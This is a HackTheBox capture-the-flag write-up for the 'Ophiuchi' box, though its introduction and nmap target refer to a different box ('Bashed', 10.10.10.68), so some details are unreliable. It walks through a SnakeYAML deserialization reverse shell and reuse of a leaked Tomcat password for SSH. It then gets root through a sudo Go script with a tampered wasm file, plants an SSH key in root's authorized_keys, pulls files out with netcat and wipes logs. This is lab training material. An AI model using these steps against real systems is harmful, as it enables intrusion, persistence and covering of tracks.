[Back to Main Page](../index.html) 

# Ophiuchi on HackTheBox


![htb](https://www.yeahhub.com/wp-content/uploads/2018/03/hackthebox.png)



## Introduction

Bashed is a medium box which was a CTF I attempted after a rather long break.

This write up assumes that the reader is using Kali, but any pentesting distro such as [BlackArch](https://blackarch.org/) will work. The tools come with a stock Kali installation, unless otherwise mentioned.

## 1. Initial Scanning

All we do have is an IP so we start to run a nmapAutomator scan.

`nmap 10.10.10.68`

nmap did find two ports.
* 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
* 8080/tcp open http Apache Tomcat 9.0.38

Browsing to the website hosted on the Apache Tomcat, I found out that it is an online parser for YAML. 

![1ophiuchi](https://i.imgur.com/cGWoc4Z.png)

## 2. SnakeYAML deserialization exploit

After a bit of abusing google to figure out what YAML exactly is, and how to exploit it, I stumbled over the 'SnakeYAML deserialization exploit'.

![2ophiuchi](https://i.imgur.com/Gu0RJ3v.png)

We can use this deserialization vulnerablity to get remote code execution - For this I used and cloned [yaml payload on GitHub](https://github.com/artsploit/yaml-payload).

`git clone https://github.com/artsploit/yaml-payload`

<img src="https://i.imgur.com/RhMPiJH.png" width="600">

There we modified the AwesomeScriptEngineFactory() method within AwesomeScriptEngineFactory.java. We can use the payloads found [Issue-3](https://github.com/artsploit/yaml-payload/issues/3) with our IP. Now as explained in the repository, I compiled the AwesomeScriptEngineFactory.java and build the yaml-payload.jar file.

<img src="https://i.imgur.com/zG8TUn8.png" width="600">

This payload I copied to the apache directory and made sure the server is running.

`cp yaml-payload.jar /var/www/html/yaml-payload.jar && sudo service apache2 start`

Now, we should be able to execute the YAML parser on the victim's machine, after starting the netcast listener on port 8081.

<img src="https://i.imgur.com/0pf8eVX.png" width="600">

One I clicked the PARSE button, the payload was executed and I had access to the reverse shell as the tomcat user.

<img src="https://i.imgur.com/tJ79z7A.png" width="600">

## 3. Privilege Escalation - User

Finding the user flag is fairly simple. After a basic enumeration we'll find that /opt/tomcat/conf/tomcat-users.xml contains a password for the admin user.

`<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>`

We can now ssh into the machine as suer admin using the obtained creds.

## 4. Privilege Escalation - root

First, I checked what sudo capabilities our user admin got.

`sudo -l`
`(ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go`

So we can run `/usr/bin/go run /opt/wasm-functions/index.go` with root privileges. Let’s check out the file.

If we're able to control the f variable, then we can create a deploy.sh to be executed in another directory. What's notable here is that absolute path is not used for main.wasm and the deploy.sh files. These files will be read from our current working directory, from where we run the index.go file.

We make our working directory in tmp and copy over the main.wasm file.

`cd tmp`
`mkdir work && cd work`
`cp /opt/wasm-functions/main.wasm ./`

Writing our own deploy echoing the id of the user gives us the error 'Not ready to deploy'. So the value of f is not 1, which is read from the wasm file.

The text readable format of WASM binary is WAT(Web Assembly Text). We can manipulate the value of f editing the wasm file in this format. 

We install the toolsuit https://github.com/webassembly/wabt We have 2 binaries wasm2wat and wat2wasm that we can use, then we transfer the main.wasm file from the target machine to our local machine using nc.

`cat main.wasm | nc {your-ip} {your-port}   (on target)`
`nc -lnvp {your-port} > main.wasm           (on local)`

Then, we convert the wasm to wat

`wasm2wat main.wasm > main.wat`
`cat main.wat`

Here we see that the value of f is a constant 0, we change that to 1, our required value and convert the wat back to wasm, before moving it back.
  
`[-]    i32.const 0)`
`[+]    i32.const 1)`
`wat2wasm main.wat`
`scp main.wasm admin@ophiuchi.htb:/tmp/work`

Now, we run the sudo command again. And this time we get command execution as root. Then, we get our id_rsa.pub using ssh-keygen and paste it to the authorized_keys file at /root/.ssh/ using the deploy.sh file to be able to SSH into the machine as root.

`root@kali" >> /root/.ssh/authorized_keys`

Finally we grab the root.txt file with SSH.

`ssh root@ophiuchi.htb`
`cat root.txt`

## 5. Cleanup
 
Since this is a CTF, cleanup isn’t mandatory.
However, we want to develop good habits and operational security practice. Meterpreter has a `clearev` command that can be used to cover our tracks - let’s run it and be out of here.

![hacked](https://cdn-images-1.medium.com/max/1600/1*TtuBByJ52bSP-d2WPOczJg.png)
